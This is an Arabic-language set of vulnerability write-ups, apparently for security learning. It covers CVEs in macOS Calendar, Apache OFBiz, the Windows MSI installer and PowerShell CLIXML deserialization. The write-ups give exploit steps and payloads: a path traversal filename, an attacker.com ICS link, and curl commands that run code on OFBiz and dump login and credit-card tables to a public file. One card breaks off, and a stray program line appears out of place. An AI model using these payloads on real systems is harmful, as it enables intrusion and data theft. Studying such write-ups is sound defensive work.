Zero-Click Calendar Invite — سلسلة ثغرات zero-click في macOS

CRITICAL
RCE Path Traversal TCC Bypass
البرنامج: Apple macOS Calendar / Photos
CVE: CVE-2022-46723, CVE-2023-40434
الباحث: Mikko Kenttälä

خطوات الاستغلال

  1. إرسال دعوة Calendar خبيثة للضحية تحتوي على مرفق بـ filename غير مُ sanitized — استخدام directory traversal في حقل ATTACH: FILENAME=../../../PoC.txt
  2. الملف يُكتب خارج مجلد Calendar الطبيعي في ~/Library/Calendar/ بدل المسار المتوقع — وعند حذف الحدث يُحذف الملف المستهدف
  3. حقن 5 ملفات متسلسلة: calendar مزيف + ملف migration + DMG + stage1.url + stage2.url لاستغلال ترقية macOS Monterey → Ventura
  4. فتح CalPoCInit.dmg عبر alert في Calendar — الـ DMG يشير لـ Samba mount بدون quarantine flag (Gatekeeper bypass)
  5. تسجيل custom URL scheme mymiditest:// ثم فتحه عبر stage2.url لتشغيل تطبيق خبيث بدون أي تفاعل من المستخدم
  6. تغيير System Photo Library عبر defaults import للوصول لصور iCloud المحمية بـ TCC
FILENAME=../../../PoC.txt ATTACH;VALUE=URI:https://attacker.com/evil.ics # Custom URL scheme registration in Info.plist <key>CFBundleURLSchemes</key> <array><string>mymiditest</string></array> # Photos config hijack defaults import com.apple.Photos /var/tmp/mypictures/malicious.plist open /var/tmp/mypictures/Syndication.photoslibrary
Calendar.app Samba defaults DMG

💡 الدرس المستفاد

حتى sandboxed apps مثل Calendar قد تكون نقطة دخول zero-click. ركّز على: path traversal في معالجة المرفقات، abuse لـ OS upgrade flows، و bypass لـ Gatekeeper عبر network mounts بدون quarantine. TCC ليس bulletproof إذا استطعت تغيير configuration paths.

CVE-2024-45195 — Apache OFBiz Unauthenticated RCE

CRITICAL
RCE Auth Bypass
البرنامج: Apache OFBiz (< 18.12.16)
CVE: CVE-2024-45195
الباحث: Ryan Emmons (Rapid7)

خطوات الاستغلال

  1. OFBiz يستخدم parsing methods مختلفة للـ URI — controller يُحدَّد من جزء والـ view map من جزء آخر، مما يسمح بـ desynchronization
  2. الوصول لـ endpoint غير مُ authenticated (forgotPassword) مع view map مُ authenticated (xmldsdump)
  3. view map XmlDsDump ينفّذ Groovy script بدون authorization check — يمكنه dump أي entity من قاعدة البيانات
  4. كتابة البيانات الحساسة (passwords, credit cards) في ملف web-accessible
  5. الثغرة bypass لـ patches سابقة: CVE-2024-32113, CVE-2024-36104, CVE-2024-38856
# RCE via Groovy (ProgramExport - patched views) curl 'https://target:8443/webtools/control/forgotPassword/ProgramExport' \ -d "groovyProgram=throw+new+Exception('id'.execute().text);" -k # Data exfil via XmlDsDump (CVE-2024-45195) curl 'https://target:8443/webtools/control/forgotPassword/xmldsdump' \ -d "outpath=./themes/common-theme/webapp/common-theme/&filename=stolen.txt&entityName=UserLogin&entityName=CreditCard" -k # Read exfiltrated data curl 'https://target:8443/common/stolen.txt' -k
curl Burp Suite Groovy

💡 الدرس المستفاد

patch bypasses شائعة عندما يُصلح السطح بدل السبب الجذري. عند اختبار OFBiz أو frameworks مشابهة: جرّب desync بين controller و view map، وابحث عن Groovy scripts بدون permission checks.

HIGH
LPE PrivEsc
البرنامج: Microsoft Windows MSI Installer
CVE: CVE-2024-38014 (CVSS 7.8)
الباحث: Michael Baer (SEC Consult)

خطوات الاستغلال

  1. مستخدم low-privilege يشغّل repair على MSI installer مثبت مسبقاً — الـ repair يعمل بـ NT AUTHORITY\SYSTEM

# Start repair as low-priv user msiexec.exe /fa {PRODUCT-GUID} # Keep console window open with OpLock loop while ($true) { .\SetOpLock.exe "C:\Program Files\App\target.exe" x } # Analyze MSI with msiscan msiscan.exe vulnerable_installer.msi

💡 الدرس المستفاد

البرنامج: Private Program (Keycloak / HackerOne)
الباحث: Deepanshu (golu369)

PowerShell CLIXML Deserialization — Hyper-V Guest-to-Host Breakout

HIGH
Deserialization RCE PrivEsc
البرنامج: PowerShell / Hyper-V / Windows
CWE: CWE-502 (Untrusted Deserialization)
الباحث: Truesec (SEC-T 2024)

خطوات الاستغلال

  1. PowerShell يستخدم CLIXML format عبر Import-Clixml / [PSSerializer]::Deserialize() — أي CLIXML غير موثوق = attack surface
  2. CLIXML يدعم primitive types (<SBK> ScriptBlock) و complex types (<Obj>) — يمكن craft gadget chains
  3. في Hyper-V scenario: guest يتحكم في CLIXML file يُ deserialize على الـ host عبر integration services
  4. بعد deserialization، الـ object يُ rehydrate كـ property bag — gadget chain يُ trigger chain of function calls → code execution
  5. الهجوم مرتبط بـ ProxyNotShell exploit chain في Exchange — لكن هنا يُ apply على PowerShell بشكل عام
  6. MSRC أغلقت القضية كـ "fixed" لكن الهجوم ما زال ممكناً بدون mitigations مناسبة
# Serialize / Deserialize cycle $myobject = "Hello World!" $myobject | Export-Clixml .\example.xml $deserialized = Import-Clixml .\example.xml # CLIXML with ScriptBlock primitive (SBK tag) <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"> <SBK>get-process</SBK> </Objs> # Programmatic deserialization $serialized = [System.Management.Automation.PSSerializer]::Serialize($obj) $deserialized = [System.Management.Automation.PSSerializer]::Deserialize($serialized)
PowerShell Import-Clixml Hyper-V YsoSerial.NET

💡 الدرس المستفاد

deserialization في PowerShell CLIXML underestimated — مش بس Exchange. أي app يستدعي Import-Clixml على ملفات user-controlled = RCE. audit CLIXML files في Hyper-V guests، CI/CD artifacts، و shared storage. لا ت deserialize untrusted CLIXML أبداً.
